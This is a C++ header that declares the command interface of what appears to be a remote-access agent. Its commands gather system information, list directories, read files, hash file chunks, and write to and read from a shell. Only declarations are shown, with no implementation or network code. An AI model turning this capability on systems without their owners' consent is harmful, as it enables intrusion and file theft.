#pragma once

#include "primitives.h"
#include "shell.h"

enum CommandType : UINT8
{
    Command_GetSystemInfo = 0,
    Command_GetDirectoryContent = 1,
    Command_GetFileContent = 2,
    Command_GetFileChunkHash = 3,
    Command_WriteShell = 4,
    Command_ReadShell = 5,
    CommandTypeCount
};

enum StatusCode : UINT32
{
    StatusSuccess = 0,
    StatusError = 1,
    StatusUnknownCommand = 2
};

struct Context
{
    Shell *shell = nullptr;
    ~Context()
    {
        if (this->shell != nullptr)
        {
            delete this->shell;
            this->shell = nullptr; // Good practice to avoid double-free
        }
    }
};

using CommandHandler = VOID (*)(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);

VOID Handle_GetSystemInfoCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_ReadShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
